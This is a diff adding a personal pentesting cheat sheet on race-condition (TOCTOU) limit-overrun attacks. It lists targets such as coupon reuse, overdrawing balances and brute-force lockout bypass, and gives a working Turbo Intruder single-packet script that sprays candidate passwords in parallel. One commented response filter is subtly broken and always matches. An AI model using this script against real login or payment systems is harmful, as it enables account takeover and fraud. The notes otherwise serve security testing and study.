@@ -1,0 +1,42 @@
+Race-Condition - Limit over run  (TOCTOU - time of check to time of use)
+--------------------------------
+Commonly used when the server delays with response | abuse jitter \ internal latency
+Commonly used in:
+    1) Redeeming gift card \ coupon more than once:
+            Intercept request -> Repeater -> Group Repeater request ->  Send them parallel 
+    2) Rating a product multipule times
+    3) Withdraw \ transfer cash in excess of account balance
+    4) Re-using single CAPTCHA solution
+    5) Bypass anti-brute-force rate-limit:            (on HTTPS, make sure to set "engine=Engine.BURP2 & concurrentConnections=1")
+Note! you check for numbers of fales attempts first to see how many needed to lock user, then send with repeater x10-x20 request to see if it ignores the lock mechanisem.
+            Intercept -> Turbo-Intruder -> race-single-packet-attack.py script ->
+Edited Script by Intigriti:
+``def queueRequests(target, wordlists):
+
+    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
+    #may add at the bottom of this block, "requestPerConnection=1, pipeline=False" for x8 req per sec, pipeline=true will double speed
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    
+    # assign the list of candidate passwords from your clipboard (CTRL+C\CTRL+Shift+C)
+    # In case of a wordlist file from the system change the code line below to:
+    # for word in open('<wordlist path from system>'):    | in case i want to try specific number of lines, for word in open('<wordlist>').readlines()[0:30]: 
+    for word in wordlists.clipboard:
+        engine.queue(target.req, word, gate='1')
+    engine.openGate('1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+    #For specific request code:
+    #  def handleResponse(req, interesting):
+    #    if req.status_code == 302:          |or|      if "successful" in req.response:
+    #      table.add(req)
+
+    #For proper handle response (when using big wordlist)
+    #change last block with this:
+  # def handleResponse(req, interesting):
+  #   if '200 OK' or '302 Found' in req.response:            (it depends on how the response code is written)
+  #      table.add(req)
